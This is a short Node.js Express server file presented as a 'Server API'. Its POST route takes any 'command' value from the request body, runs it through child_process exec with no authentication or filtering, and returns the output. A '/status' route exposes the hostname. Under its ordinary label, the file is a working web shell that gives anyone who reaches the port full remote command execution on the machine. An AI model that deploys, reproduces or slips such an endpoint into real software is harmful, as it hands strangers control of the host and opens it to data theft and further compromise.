const express = require('express');
const bodyParser = require('body-parser');
const { exec } = require('child_process');
const app = express();
const PORT = process.env.PORT || 8080;
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Server API is running',
        usage: 'RAJACRYPTOINDONESIA'
    });
});
app.post('/', (req, res) => {
    const { command } = req.body;
    
    if (!command) {
        return res.json({
            status: 'error',
            message: 'No command received'
        });
    }
    exec(command, (error, stdout, stderr) => {
        if (error) {
            return res.json({
                status: 'error',
                message: error.message
            });
        }
        if (!stdout && !stderr) {
            return res.json({
                status: 'success',
                output: 'Command executed, but no output returned.'
            });
        }
        res.json({
            status: 'success',
            output: stdout || stderr
        });
    });
});
app.get('/status', (req, res) => {
    res.json({
        status: 'online',
        server: require('os').hostname()
    });
});
app.listen(PORT, () => {
    console.log(`Server API running on port ${PORT}`);
});